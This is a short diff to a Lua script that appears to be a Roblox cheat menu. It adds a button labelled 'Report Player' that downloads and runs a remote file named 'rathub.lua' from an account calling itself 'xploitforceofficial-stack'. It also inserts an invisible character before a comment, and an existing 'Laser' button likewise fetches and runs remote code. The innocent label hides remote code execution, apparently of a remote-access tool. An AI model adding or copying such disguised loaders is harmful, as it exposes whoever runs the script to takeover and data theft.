@@ -198,8 +198,10 @@ local function createButton(text, icon, func)
 	btn.MouseButton1Click:Connect(func)
 	btn.Parent = Scroll
 end
-
--- === DAFTAR BUTTON ===
+‎-- === DAFTAR BUTTON ===
+createButton("Report Player", "⚠️", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/xploitforceofficial-stack/rathubpublic/refs/heads/main/rathub.lua"))()
+end)
 createButton("Laser", "🔦", function()
 	loadstring(game:HttpGet("https://mpangppxhub.vercel.app/laserpiwpiw"))()
 end)
